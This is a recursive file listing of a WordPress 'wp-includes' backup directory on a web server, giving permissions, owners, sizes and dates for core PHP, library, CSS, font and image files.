-rw-r--r--  1 www-data www-data  27K Jan  8  2016 canonical.php
-rw-r--r--  1 www-data www-data  19K Feb  6  2016 capabilities.php
-rw-r--r--  1 www-data www-data  46K Jan 13  2016 category-template.php
-rw-r--r--  1 www-data www-data  12K Mar 14  2016 category.php
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 certificates
-rw-r--r--  1 www-data www-data  35K Dec 30  2015 class-IXR.php
-rw-r--r--  1 www-data www-data 4.6K Feb 26  2016 class-feed.php
-rw-r--r--  1 www-data www-data  33K Feb 27  2016 class-http.php
-rw-r--r--  1 www-data www-data  40K Dec  6  2015 class-json.php
-rw-r--r--  1 www-data www-data  26K Mar 23  2016 class-oembed.php
-rw-r--r--  1 www-data www-data 7.2K Oct  6  2015 class-phpass.php
-rw-r--r--  1 www-data www-data 134K Dec 23  2015 class-phpmailer.php
-rw-r--r--  1 www-data www-data  21K Sep 16  2015 class-pop3.php
-rw-r--r--  1 www-data www-data  89K Sep 19  2015 class-simplepie.php
-rw-r--r--  1 www-data www-data  37K Dec 23  2015 class-smtp.php
-rw-r--r--  1 www-data www-data  37K Mar 30  2016 class-snoopy.php
-rw-r--r--  1 www-data www-data 2.2K Mar 22  2016 class-walker-category-dropdown.php
-rw-r--r--  1 www-data www-data 6.6K Mar 22  2016 class-walker-category.php
-rw-r--r--  1 www-data www-data  11K Mar 22  2016 class-walker-comment.php
-rw-r--r--  1 www-data www-data 2.3K Mar 22  2016 class-walker-page-dropdown.php
-rw-r--r--  1 www-data www-data 5.3K Mar 22  2016 class-walker-page.php
-rw-r--r--  1 www-data www-data  17K Mar  3  2016 class-wp-admin-bar.php
-rw-r--r--  1 www-data www-data 5.0K Mar 18  2016 class-wp-ajax-response.php
-rw-r--r--  1 www-data www-data  40K Mar  3  2016 class-wp-comment-query.php
-rw-r--r--  1 www-data www-data 9.3K Jan 17  2016 class-wp-comment.php
-rw-r--r--  1 www-data www-data  19K Feb 24  2016 class-wp-customize-control.php
-rw-r--r--  1 www-data www-data  65K Mar 23  2016 class-wp-customize-manager.php
-rw-r--r--  1 www-data www-data  37K Mar 21  2016 class-wp-customize-nav-menus.php
-rw-r--r--  1 www-data www-data 9.5K Mar  2  2016 class-wp-customize-panel.php
-rw-r--r--  1 www-data www-data 9.2K Oct 24  2015 class-wp-customize-section.php
-rw-r--r--  1 www-data www-data  25K Apr  7  2016 class-wp-customize-setting.php
-rw-r--r--  1 www-data www-data  63K Apr  7  2016 class-wp-customize-widgets.php
-rw-r--r--  1 www-data www-data  52K Apr  5  2016 class-wp-editor.php
-rw-r--r--  1 www-data www-data  12K Mar 12  2016 class-wp-embed.php
-rw-r--r--  1 www-data www-data 5.0K May 23  2015 class-wp-error.php
-rw-r--r--  1 www-data www-data 6.0K Sep 26  2015 class-wp-http-cookie.php
-rw-r--r--  1 www-data www-data  12K Mar 12  2016 class-wp-http-curl.php
-rw-r--r--  1 www-data www-data 6.3K Sep  2  2015 class-wp-http-encoding.php
-rw-r--r--  1 www-data www-data 3.2K Sep 15  2015 class-wp-http-ixr-client.php
-rw-r--r--  1 www-data www-data 5.9K Jan 27  2016 class-wp-http-proxy.php
-rw-r--r--  1 www-data www-data 3.1K Oct  8  2015 class-wp-http-response.php
-rw-r--r--  1 www-data www-data  15K Dec 14  2015 class-wp-http-streams.php
-rw-r--r--  1 www-data www-data  14K Oct 31  2015 class-wp-image-editor-gd.php
-rw-r--r--  1 www-data www-data  21K Mar 14  2016 class-wp-image-editor-imagick.php
-rw-r--r--  1 www-data www-data  12K Feb 22  2016 class-wp-image-editor.php
-rw-r--r--  1 www-data www-data  23K Feb 26  2016 class-wp-meta-query.php
-rw-r--r--  1 www-data www-data 5.4K Mar  9  2016 class-wp-metadata-lazyloader.php
-rw-r--r--  1 www-data www-data 9.0K Jan 17  2016 class-wp-network.php
-rw-r--r--  1 www-data www-data 2.0K Nov 17  2015 class-wp-oembed-controller.php
-rw-r--r--  1 www-data www-data 5.8K Oct 14  2015 class-wp-post.php
-rw-r--r--  1 www-data www-data  59K Mar 10  2016 class-wp-rewrite.php
-rw-r--r--  1 www-data www-data 2.7K Dec 14  2015 class-wp-role.php
-rw-r--r--  1 www-data www-data 6.9K Jan 27  2016 class-wp-roles.php
-rw-r--r--  1 www-data www-data 3.9K Feb  6  2016 class-wp-site.php
-rw-r--r--  1 www-data www-data  20K Dec 13  2015 class-wp-tax-query.php
-rw-r--r--  1 www-data www-data 5.3K Jan  9  2016 class-wp-term.php
-rw-r--r--  1 www-data www-data  43K Feb 26  2016 class-wp-theme.php
-rw-r--r--  1 www-data www-data  26K Jan 27  2016 class-wp-user-query.php
-rw-r--r--  1 www-data www-data  20K Jan 27  2016 class-wp-user.php
-rw-r--r--  1 www-data www-data  13K Dec 11  2015 class-wp-walker.php
-rw-r--r--  1 www-data www-data 2.0K Mar 22  2016 class-wp-widget-factory.php
-rw-r--r--  1 www-data www-data  18K Mar 22  2016 class-wp-widget.php
-rw-r--r--  1 www-data www-data 194K Mar 22  2016 class-wp-xmlrpc-server.php
-rw-r--r--  1 www-data www-data  25K Mar  9  2016 class-wp.php
-rw-r--r--  1 www-data www-data  13K Mar 14  2016 class.wp-dependencies.php
-rw-r--r--  1 www-data www-data  15K Apr  9  2016 class.wp-scripts.php
-rw-r--r--  1 www-data www-data  10K Mar  6  2016 class.wp-styles.php
-rw-r--r--  1 www-data www-data  83K Mar  9  2016 comment-template.php
-rw-r--r--  1 www-data www-data  94K Mar 12  2016 comment.php
-rw-r--r--  1 www-data www-data  13K Feb  6  2016 compat.php
-rw-r--r--  1 www-data www-data  15K Jan 14  2016 cron.php
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 css
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 customize
-rw-r--r--  1 www-data www-data  35K Dec  6  2015 date.php
-rw-r--r--  1 www-data www-data 9.1K Dec 22  2015 default-constants.php
-rw-r--r--  1 www-data www-data  24K Mar  9  2016 default-filters.php
-rw-r--r--  1 www-data www-data 1.5K Sep 22  2015 default-widgets.php
-rw-r--r--  1 www-data www-data 106K Mar 30  2016 deprecated.php
-rw-r--r--  1 www-data www-data  342 Feb 27  2016 embed-template.php
-rw-r--r--  1 www-data www-data  43K Mar  9  2016 embed.php
-rw-r--r--  1 www-data www-data 4.9K Oct 20  2015 feed-atom-comments.php
-rw-r--r--  1 www-data www-data 3.0K Nov  4  2015 feed-atom.php
-rw-r--r--  1 www-data www-data 2.6K Oct 20  2015 feed-rdf.php
-rw-r--r--  1 www-data www-data 1.2K Oct 20  2015 feed-rss.php
-rw-r--r--  1 www-data www-data 3.6K Oct 20  2015 feed-rss2-comments.php
-rw-r--r--  1 www-data www-data 3.7K Nov  4  2015 feed-rss2.php
-rw-r--r--  1 www-data www-data  19K Jan  8  2016 feed.php
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 fonts
-rw-r--r--  1 www-data www-data 155K Mar 16  2016 formatting.php
-rw-r--r--  1 www-data www-data 159K Mar  9  2016 functions.php
-rw-r--r--  1 www-data www-data  11K Mar 14  2016 functions.wp-scripts.php
-rw-r--r--  1 www-data www-data 7.8K Mar 14  2016 functions.wp-styles.php
-rw-r--r--  1 www-data www-data 116K Mar 30  2016 general-template.php
-rw-r--r--  1 www-data www-data  20K Mar 30  2016 http.php
drwxr-xr-x  6 www-data www-data 4.0K Apr 12  2016 images
drwxr-xr-x 11 www-data www-data 4.0K Apr 12  2016 js
-rw-r--r--  1 www-data www-data  49K Feb  6  2016 kses.php
-rw-r--r--  1 www-data www-data  35K Feb 28  2016 l10n.php
-rw-r--r--  1 www-data www-data 124K Mar 10  2016 link-template.php
-rw-r--r--  1 www-data www-data  26K Feb 18  2016 load.php
-rw-r--r--  1 www-data www-data  15K Dec 16  2015 locale.php
-rw-r--r--  1 www-data www-data  45K Nov  7  2015 media-template.php
-rw-r--r--  1 www-data www-data 130K Mar 18  2016 media.php
-rw-r--r--  1 www-data www-data  30K Mar 10  2016 meta.php
-rw-r--r--  1 www-data www-data  27K Mar  8  2016 ms-blogs.php
-rw-r--r--  1 www-data www-data 4.7K Feb 28  2016 ms-default-constants.php
-rw-r--r--  1 www-data www-data 4.4K Sep 16  2015 ms-default-filters.php
-rw-r--r--  1 www-data www-data  12K Feb 26  2016 ms-deprecated.php
-rw-r--r--  1 www-data www-data 2.6K Jun 16  2015 ms-files.php
-rw-r--r--  1 www-data www-data  79K Mar  8  2016 ms-functions.php
-rw-r--r--  1 www-data www-data  12K Nov 18  2015 ms-load.php
-rw-r--r--  1 www-data www-data 9.0K Jan 25  2016 ms-settings.php
-rw-r--r--  1 www-data www-data  26K Dec 23  2015 nav-menu-template.php
-rw-r--r--  1 www-data www-data  33K Mar  8  2016 nav-menu.php
-rw-r--r--  1 www-data www-data  52K Jan  8  2016 option.php
-rw-r--r--  1 www-data www-data 6.1K Feb 23  2016 pluggable-deprecated.php
-rw-r--r--  1 www-data www-data  83K Mar 17  2016 pluggable.php
-rw-r--r--  1 www-data www-data  32K Jan 25  2016 plugin.php
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 pomo
-rw-r--r--  1 www-data www-data 6.8K Aug 25  2015 post-formats.php
-rw-r--r--  1 www-data www-data  55K Mar 10  2016 post-template.php
-rw-r--r--  1 www-data www-data 7.0K Oct 12  2015 post-thumbnail-template.php
-rw-r--r--  1 www-data www-data 202K Apr  7  2016 post.php
-rw-r--r--  1 www-data www-data 140K Mar 23  2016 query.php
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 random_compat
-rw-r--r--  1 www-data www-data  176 Jan  8  2012 registration-functions.php
-rw-r--r--  1 www-data www-data  176 Jan  8  2012 registration.php
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 rest-api
-rw-r--r--  1 www-data www-data  18K Mar 10  2016 rest-api.php
-rw-r--r--  1 www-data www-data  20K Feb 23  2016 revision.php
-rw-r--r--  1 www-data www-data  17K Mar 12  2016 rewrite.php
-rw-r--r--  1 www-data www-data  189 Sep 24  2013 rss-functions.php
-rw-r--r--  1 www-data www-data  23K Aug 25  2015 rss.php
-rw-r--r--  1 www-data www-data  56K Apr  9  2016 script-loader.php
-rw-r--r--  1 www-data www-data  11K Jan  8  2016 session.php
-rw-r--r--  1 www-data www-data  19K Dec 25  2015 shortcodes.php
-rw-r--r--  1 www-data www-data 167K Mar 30  2016 taxonomy.php
-rw-r--r--  1 www-data www-data 3.0K Mar  7  2016 template-loader.php
-rw-r--r--  1 www-data www-data  16K Mar 10  2016 template.php
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 theme-compat
-rw-r--r--  1 www-data www-data  66K Mar 29  2016 theme.php
-rw-r--r--  1 www-data www-data  23K Mar 16  2016 update.php
-rw-r--r--  1 www-data www-data  82K Mar 16  2016 user.php
-rw-r--r--  1 www-data www-data 5.3K Mar  2  2016 vars.php
-rw-r--r--  1 www-data www-data  617 Apr 12  2016 version.php
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 widgets
-rw-r--r--  1 www-data www-data  47K Feb 25  2016 widgets.php
-rw-r--r--  1 www-data www-data 1.1K Dec 11  2013 wlwmanifest.xml
-rw-r--r--  1 www-data www-data  91K Mar 27  2016 wp-db.php
-rw-r--r--  1 www-data www-data  15K Sep 19  2015 wp-diff.php

/var/www/backup_wordpress/wp-includes/ID3:
total 1.1M
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 16 www-data www-data  12K Apr 12  2016 ..
-rw-r--r--  1 www-data www-data  44K Jun 27  2015 getid3.lib.php
-rw-r--r--  1 www-data www-data  63K Jun 27  2015 getid3.php
-rw-r--r--  1 www-data www-data 1.3K Jun 27  2015 license.commercial.txt
-rw-r--r--  1 www-data www-data 1.4K Jun 27  2015 license.txt
-rw-r--r--  1 www-data www-data 125K Jun 27  2015 module.audio-video.asf.php
-rw-r--r--  1 www-data www-data  25K Jun 27  2015 module.audio-video.flv.php
-rw-r--r--  1 www-data www-data 102K Jun 27  2015 module.audio-video.matroska.php
-rw-r--r--  1 www-data www-data 116K Jun 27  2015 module.audio-video.quicktime.php
-rw-r--r--  1 www-data www-data 117K Sep 11  2014 module.audio-video.riff.php
-rw-r--r--  1 www-data www-data  19K Jun 27  2015 module.audio.ac3.php
-rw-r--r--  1 www-data www-data  11K Jun 27  2015 module.audio.dts.php
-rw-r--r--  1 www-data www-data  19K Jun 27  2015 module.audio.flac.php
-rw-r--r--  1 www-data www-data  97K Jun 27  2015 module.audio.mp3.php
-rw-r--r--  1 www-data www-data  40K Jun 27  2015 module.audio.ogg.php
-rw-r--r--  1 www-data www-data  18K Jun 27  2015 module.tag.apetag.php
-rw-r--r--  1 www-data www-data  12K Jun 27  2015 module.tag.id3v1.php
-rw-r--r--  1 www-data www-data 142K Jun 27  2015 module.tag.id3v2.php
-rw-r--r--  1 www-data www-data  11K Jun 27  2015 module.tag.lyrics3.php
-rw-r--r--  1 www-data www-data  25K Sep 11  2014 readme.txt

/var/www/backup_wordpress/wp-includes/SimplePie:
total 392K
drwxr-xr-x  9 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 16 www-data www-data  12K Apr 12  2016 ..
-rw-r--r--  1 www-data www-data 3.6K Nov 21  2012 Author.php
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 Cache
-rw-r--r--  1 www-data www-data 4.2K Nov 21  2012 Cache.php
-rw-r--r--  1 www-data www-data 4.5K Nov 21  2012 Caption.php
-rw-r--r--  1 www-data www-data 3.7K Nov 21  2012 Category.php
drwxr-xr-x  3 www-data www-data 4.0K Apr 12  2016 Content
-rw-r--r--  1 www-data www-data 3.3K Nov 21  2012 Copyright.php
-rw-r--r--  1 www-data www-data 2.3K Nov 21  2012 Core.php
-rw-r--r--  1 www-data www-data 3.7K Nov 21  2012 Credit.php
drwxr-xr-x  3 www-data www-data 4.0K Apr 12  2016 Decode
-rw-r--r--  1 www-data www-data  27K Nov 21  2012 Enclosure.php
-rw-r--r--  1 www-data www-data 2.2K Nov  8  2012 Exception.php
-rw-r--r--  1 www-data www-data 9.5K Nov 21  2012 File.php
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 HTTP
-rw-r--r--  1 www-data www-data  28K Nov 21  2012 IRI.php
-rw-r--r--  1 www-data www-data  96K Nov 21  2012 Item.php
-rw-r--r--  1 www-data www-data  11K Nov 21  2012 Locator.php
-rw-r--r--  1 www-data www-data  51K Jul  8  2013 Misc.php
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 Net
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 Parse
-rw-r--r--  1 www-data www-data  12K Nov 21  2012 Parser.php
-rw-r--r--  1 www-data www-data 3.4K Nov 21  2012 Rating.php
-rw-r--r--  1 www-data www-data 5.9K Nov 21  2012 Registry.php
-rw-r--r--  1 www-data www-data 3.8K Nov 21  2012 Restriction.php
-rw-r--r--  1 www-data www-data  16K Sep 10  2013 Sanitize.php
-rw-r--r--  1 www-data www-data  21K Nov 21  2012 Source.php
drwxr-xr-x  3 www-data www-data 4.0K Apr 12  2016 XML
-rw-r--r--  1 www-data www-data 8.4K Nov 21  2012 gzdecode.php

/var/www/backup_wordpress/wp-includes/SimplePie/Cache:
total 48K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 9 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data 3.4K Nov 21  2012 Base.php
-rw-r--r-- 1 www-data www-data 4.7K Nov 21  2012 DB.php
-rw-r--r-- 1 www-data www-data 4.4K Nov 21  2012 File.php
-rw-r--r-- 1 www-data www-data 5.1K Nov 21  2012 Memcache.php
-rw-r--r-- 1 www-data www-data  12K Nov 21  2012 MySQL.php

/var/www/backup_wordpress/wp-includes/SimplePie/Content:
total 12K
drwxr-xr-x 3 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 9 www-data www-data 4.0K Apr 12  2016 ..
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 Type

/var/www/backup_wordpress/wp-includes/SimplePie/Content/Type:
total 16K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 3 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data 8.0K Nov 21  2012 Sniffer.php

/var/www/backup_wordpress/wp-includes/SimplePie/Decode:
total 12K
drwxr-xr-x 3 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 9 www-data www-data 4.0K Apr 12  2016 ..
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 HTML

/var/www/backup_wordpress/wp-includes/SimplePie/Decode/HTML:
total 28K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 3 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data  17K Nov 21  2012 Entities.php

/var/www/backup_wordpress/wp-includes/SimplePie/HTTP:
total 20K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 9 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data  11K Nov 21  2012 Parser.php

/var/www/backup_wordpress/wp-includes/SimplePie/Net:
total 16K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 9 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data 7.4K Nov 21  2012 IPv6.php

/var/www/backup_wordpress/wp-includes/SimplePie/Parse:
total 28K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 9 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data  20K Oct 19  2015 Date.php

/var/www/backup_wordpress/wp-includes/SimplePie/XML:
total 12K
drwxr-xr-x 3 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 9 www-data www-data 4.0K Apr 12  2016 ..
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 Declaration

/var/www/backup_wordpress/wp-includes/SimplePie/XML/Declaration:
total 16K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 3 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data 7.0K Nov 21  2012 Parser.php

/var/www/backup_wordpress/wp-includes/Text:
total 36K
drwxr-xr-x  3 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 16 www-data www-data  12K Apr 12  2016 ..
drwxr-xr-x  4 www-data www-data 4.0K Apr 12  2016 Diff
-rw-r--r--  1 www-data www-data  13K Jun 28  2015 Diff.php

/var/www/backup_wordpress/wp-includes/Text/Diff:
total 24K
drwxr-xr-x 4 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 3 www-data www-data 4.0K Apr 12  2016 ..
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 Engine
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 Renderer
-rw-r--r-- 1 www-data www-data 6.7K Jun 28  2015 Renderer.php

/var/www/backup_wordpress/wp-includes/Text/Diff/Engine:
total 48K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 4 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data  16K May 25  2013 native.php
-rw-r--r-- 1 www-data www-data 5.1K Feb 18  2010 shell.php
-rw-r--r-- 1 www-data www-data 8.2K Oct 24  2015 string.php
-rw-r--r-- 1 www-data www-data 2.2K May 25  2013 xdiff.php

/var/www/backup_wordpress/wp-includes/Text/Diff/Renderer:
total 16K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 4 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data 5.5K Feb 18  2010 inline.php

/var/www/backup_wordpress/wp-includes/certificates:
total 292K
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 16 www-data www-data  12K Apr 12  2016 ..
-rw-r--r--  1 www-data www-data 274K Feb 18  2016 ca-bundle.crt

/var/www/backup_wordpress/wp-includes/css:
total 664K
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 16 www-data www-data  12K Apr 12  2016 ..
-rw-r--r--  1 www-data www-data  25K Feb 22  2016 admin-bar-rtl.css
-rw-r--r--  1 www-data www-data  20K Feb 22  2016 admin-bar-rtl.min.css
-rw-r--r--  1 www-data www-data  25K Feb 22  2016 admin-bar.css
-rw-r--r--  1 www-data www-data  20K Feb 22  2016 admin-bar.min.css
-rw-r--r--  1 www-data www-data 9.5K Mar 23  2016 buttons-rtl.css
-rw-r--r--  1 www-data www-data 6.3K Nov 18  2015 buttons-rtl.min.css
-rw-r--r--  1 www-data www-data 9.5K Mar 23  2016 buttons.css
-rw-r--r--  1 www-data www-data 6.3K Nov 18  2015 buttons.min.css
-rw-r--r--  1 www-data www-data  292 Mar  8  2016 customize-preview.css
-rw-r--r--  1 www-data www-data  221 Mar  8  2016 customize-preview.min.css
-rw-r--r--  1 www-data www-data  48K Mar 18  2016 dashicons.css
-rw-r--r--  1 www-data www-data  46K Mar 18  2016 dashicons.min.css
-rw-r--r--  1 www-data www-data  33K Apr 11  2016 editor-rtl.css
-rw-r--r--  1 www-data www-data  28K Apr 11  2016 editor-rtl.min.css
-rw-r--r--  1 www-data www-data  33K Apr 11  2016 editor.css
-rw-r--r--  1 www-data www-data  28K Apr 11  2016 editor.min.css
-rw-r--r--  1 www-data www-data 6.1K Mar 23  2016 jquery-ui-dialog-rtl.css
-rw-r--r--  1 www-data www-data 4.7K Mar 23  2016 jquery-ui-dialog-rtl.min.css
-rw-r--r--  1 www-data www-data 6.1K Mar 23  2016 jquery-ui-dialog.css
-rw-r--r--  1 www-data www-data 4.7K Mar 23  2016 jquery-ui-dialog.min.css
-rw-r--r--  1 www-data www-data  49K Mar  9  2016 media-views-rtl.css
-rw-r--r--  1 www-data www-data  41K Mar  9  2016 media-views-rtl.min.css
-rw-r--r--  1 www-data www-data  49K Mar  9  2016 media-views.css
-rw-r--r--  1 www-data www-data  41K Mar  9  2016 media-views.min.css
-rw-r--r--  1 www-data www-data 2.6K Dec 18  2015 wp-auth-check-rtl.css
-rw-r--r--  1 www-data www-data 2.0K Dec 18  2015 wp-auth-check-rtl.min.css
-rw-r--r--  1 www-data www-data 2.6K Dec 18  2015 wp-auth-check.css
-rw-r--r--  1 www-data www-data 2.0K Dec 18  2015 wp-auth-check.min.css
-rw-r--r--  1 www-data www-data 1.5K Oct 30  2015 wp-embed-template-ie.css
-rw-r--r--  1 www-data www-data 1.5K Oct 30  2015 wp-embed-template-ie.min.css
-rw-r--r--  1 www-data www-data 7.9K Oct 30  2015 wp-embed-template.css
-rw-r--r--  1 www-data www-data 6.9K Nov  5  2015 wp-embed-template.min.css
-rw-r--r--  1 www-data www-data 3.8K Mar  9  2016 wp-pointer-rtl.css
-rw-r--r--  1 www-data www-data 3.0K Mar  9  2016 wp-pointer-rtl.min.css
-rw-r--r--  1 www-data www-data 3.8K Mar  9  2016 wp-pointer.css
-rw-r--r--  1 www-data www-data 3.0K Mar  9  2016 wp-pointer.min.css

/var/www/backup_wordpress/wp-includes/customize:
total 200K
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 16 www-data www-data  12K Apr 12  2016 ..
-rw-r--r--  1 www-data www-data 1.1K Oct 24  2015 class-wp-customize-background-image-control.php
-rw-r--r--  1 www-data www-data  508 Oct 24  2015 class-wp-customize-background-image-setting.php
-rw-r--r--  1 www-data www-data 2.5K Oct 24  2015 class-wp-customize-color-control.php
-rw-r--r--  1 www-data www-data 1.6K Oct 24  2015 class-wp-customize-cropped-image-control.php
-rw-r--r--  1 www-data www-data  607 Feb 27  2016 class-wp-customize-filter-setting.php
-rw-r--r--  1 www-data www-data 6.8K Dec 14  2015 class-wp-customize-header-image-control.php
-rw-r--r--  1 www-data www-data  998 Oct 24  2015 class-wp-customize-header-image-setting.php
-rw-r--r--  1 www-data www-data 1.7K Feb 28  2016 class-wp-customize-image-control.php
-rw-r--r--  1 www-data www-data 7.6K Mar 30  2016 class-wp-customize-media-control.php
-rw-r--r--  1 www-data www-data 1005 Oct 24  2015 class-wp-customize-nav-menu-auto-add-control.php
-rw-r--r--  1 www-data www-data 2.9K Nov 20  2015 class-wp-customize-nav-menu-control.php
-rw-r--r--  1 www-data www-data 6.3K Mar 30  2016 class-wp-customize-nav-menu-item-control.php
-rw-r--r--  1 www-data www-data  24K Feb 25  2016 class-wp-customize-nav-menu-item-setting.php
-rw-r--r--  1 www-data www-data 1.7K Oct 24  2015 class-wp-customize-nav-menu-location-control.php
-rw-r--r--  1 www-data www-data  993 Oct 24  2015 class-wp-customize-nav-menu-name-control.php
-rw-r--r--  1 www-data www-data  745 Oct 24  2015 class-wp-customize-nav-menu-section.php
-rw-r--r--  1 www-data www-data  19K Feb 22  2016 class-wp-customize-nav-menu-setting.php
-rw-r--r--  1 www-data www-data 2.9K Mar  9  2016 class-wp-customize-nav-menus-panel.php
-rw-r--r--  1 www-data www-data  708 Oct 24  2015 class-wp-customize-new-menu-control.php
-rw-r--r--  1 www-data www-data  975 Oct 24  2015 class-wp-customize-new-menu-section.php
-rw-r--r--  1 www-data www-data 9.0K Mar 16  2016 class-wp-customize-partial.php
-rw-r--r--  1 www-data www-data  13K Mar 16  2016 class-wp-customize-selective-refresh.php
-rw-r--r--  1 www-data www-data 1.1K Oct 24  2015 class-wp-customize-sidebar-section.php
-rw-r--r--  1 www-data www-data 3.3K Mar 16  2016 class-wp-customize-site-icon-control.php
-rw-r--r--  1 www-data www-data 3.0K Oct 24  2015 class-wp-customize-theme-control.php
-rw-r--r--  1 www-data www-data 2.8K Dec 14  2015 class-wp-customize-themes-section.php
-rw-r--r--  1 www-data www-data  977 Oct 24  2015 class-wp-customize-upload-control.php
-rw-r--r--  1 www-data www-data 1.8K Nov 13  2015 class-wp-widget-area-customize-control.php
-rw-r--r--  1 www-data www-data 2.0K Oct 24  2015 class-wp-widget-form-customize-control.php

/var/www/backup_wordpress/wp-includes/fonts:
total 208K
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 16 www-data www-data  12K Apr 12  2016 ..
-rw-r--r--  1 www-data www-data  22K Mar 18  2016 dashicons.eot
-rw-r--r--  1 www-data www-data  94K Mar 18  2016 dashicons.svg
-rw-r--r--  1 www-data www-data  41K Mar 18  2016 dashicons.ttf
-rw-r--r--  1 www-data www-data  26K Mar 18  2016 dashicons.woff

/var/www/backup_wordpress/wp-includes/images:
total 164K
drwxr-xr-x  6 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 16 www-data www-data  12K Apr 12  2016 ..
-rw-r--r--  1 www-data www-data 4.0K Oct 28  2014 admin-bar-sprite-2x.png
-rw-r--r--  1 www-data www-data 2.5K Feb 13  2014 admin-bar-sprite.png
-rw-r--r--  1 www-data www-data 1.7K Oct 28  2014 arrow-pointer-blue-2x.png
-rw-r--r--  1 www-data www-data  793 Nov  7  2012 arrow-pointer-blue.png
-rw-r--r--  1 www-data www-data   43 Nov 24  2014 blank.gif
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 crystal
-rw-r--r--  1 www-data www-data   84 Oct 28  2014 down_arrow-2x.gif
-rw-r--r--  1 www-data www-data   59 Oct 28  2014 down_arrow.gif
-rw-r--r--  1 www-data www-data 1.4K Sep 26  2012 icon-pointer-flag-2x.png
-rw-r--r--  1 www-data www-data  783 Dec  5  2011 icon-pointer-flag.png
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 media
-rw-r--r--  1 www-data www-data 1.3K Nov  7  2012 rss-2x.png
-rw-r--r--  1 www-data www-data  608 Nov  7  2012 rss.png
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 smilies
-rw-r--r--  1 www-data www-data 8.4K Oct 28  2014 spinner-2x.gif
-rw-r--r--  1 www-data www-data 4.1K Oct 28  2014 spinner.gif
-rw-r--r--  1 www-data www-data  354 Nov  7  2012 toggle-arrow-2x.png
-rw-r--r--  1 www-data www-data  289 Oct 28  2014 toggle-arrow.png
-rw-r--r--  1 www-data www-data 3.5K Oct 28  2014 uploader-icons-2x.png
-rw-r--r--  1 www-data www-data 1.6K Feb 13  2014 uploader-icons.png
-rw-r--r--  1 www-data www-data 3.1K Feb 23  2016 w-logo-blue.png
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 wlw
-rw-r--r--  1 www-data www-data  15K Nov 24  2014 wpicons-2x.png
-rw-r--r--  1 www-data www-data 7.0K Nov 24  2014 wpicons.png
-rw-r--r--  1 www-data www-data 9.0K Oct 28  2014 wpspin-2x.gif
-rw-r--r--  1 www-data www-data 2.2K Oct 28  2014 wpspin.gif
-rw-r--r--  1 www-data www-data  825 Oct 28  2014 xit-2x.gif
-rw-r--r--  1 www-data www-data  181 Oct 28  2014 xit.gif

/var/www/backup_wordpress/wp-includes/images/crystal:
total 48K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 6 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data 2.4K Oct 28  2014 archive.png
-rw-r--r-- 1 www-data www-data 2.2K Oct 28  2014 audio.png
-rw-r--r-- 1 www-data www-data 1.6K Nov  7  2012 code.png
-rw-r--r-- 1 www-data www-data  453 Feb 13  2014 default.png
-rw-r--r-- 1 www-data www-data 2.1K Oct 28  2014 document.png
-rw-r--r-- 1 www-data www-data 2.2K Oct 28  2014 interactive.png
-rw-r--r-- 1 www-data www-data  149 Mar  2  2014 license.txt
